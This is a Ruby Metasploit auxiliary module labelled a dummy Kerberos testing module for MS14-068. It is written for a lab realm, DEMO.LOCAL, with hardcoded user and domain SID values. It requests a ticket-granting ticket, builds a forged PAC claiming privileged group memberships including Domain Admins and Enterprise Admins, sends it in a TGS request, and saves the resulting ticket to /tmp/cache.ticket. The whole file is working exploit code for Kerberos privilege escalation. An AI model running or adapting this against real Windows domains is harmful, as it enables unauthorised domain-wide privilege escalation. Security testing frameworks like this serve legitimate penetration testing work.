##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Auxiliary

  include Msf::Kerberos::Microsoft::Client

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Dummy Kerberos testing module',
      'Description' => %q{
        Dummy Kerberos testing module
      },
      'Author' =>
        [
					'juan vazquez'
        ],
      'References' =>
        [
          ['MSB', 'MS14-068']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Dec 25 2014'
    ))
  end

  def run

		connect(:rhost => datastore['RHOST'])
    print_status("Sending AS-REQ...")

    my_key = OpenSSL::Digest.digest('MD4', Rex::Text.to_unicode('juan'))

    pre_auth = []
    pre_auth << build_as_pa_time_stamp(key: my_key)
    pre_auth << build_pa_pac_request
    pre_auth

    res = send_request_as(
      client_name: 'juan',
      server_name: 'krbtgt/DEMO.LOCAL',
      realm: 'DEMO.LOCAL',
      key: my_key,
      pa_data: pre_auth
    )

    unless res.msg_type == 11
      print_error("invalid response :(")
      return
    end

    print_good("good answer!")
    print_status("Parsing AS-REP...")

    session_key = extract_session_key(res, my_key)
    logon_time = extract_logon_time(res, my_key)

    ticket = res.ticket

    print_status("Sending TGS-REQ...")

    pac = build_pac(
      client_name: 'juan',
      group_ids: [513, 512, 520, 518, 519],
      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962',
      realm: 'DEMO.LOCAL',
      logon_time: logon_time,
    )

    res = send_request_tgs(
      client_name: 'juan',
      server_name: 'krbtgt/DEMO.LOCAL',
      realm: 'DEMO.LOCAL',
      key: my_key,
      logon_time: logon_time,
      session_key: session_key,
      ticket: ticket,
      group_ids: [513, 512, 520, 518, 519],
      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962',
      pac: pac.encode
    )

    unless res.msg_type == 13
      print_error("invalid response :(")
      return
    end

    print_good("Valid TGS-Response")

    cache = extract_kerb_creds(res, 'AAAABBBBCCCCDDDD')

    pp cache

    f = File.new('/tmp/cache.ticket', 'wb')
    f.write(cache.encode)
    f.close
  end
end

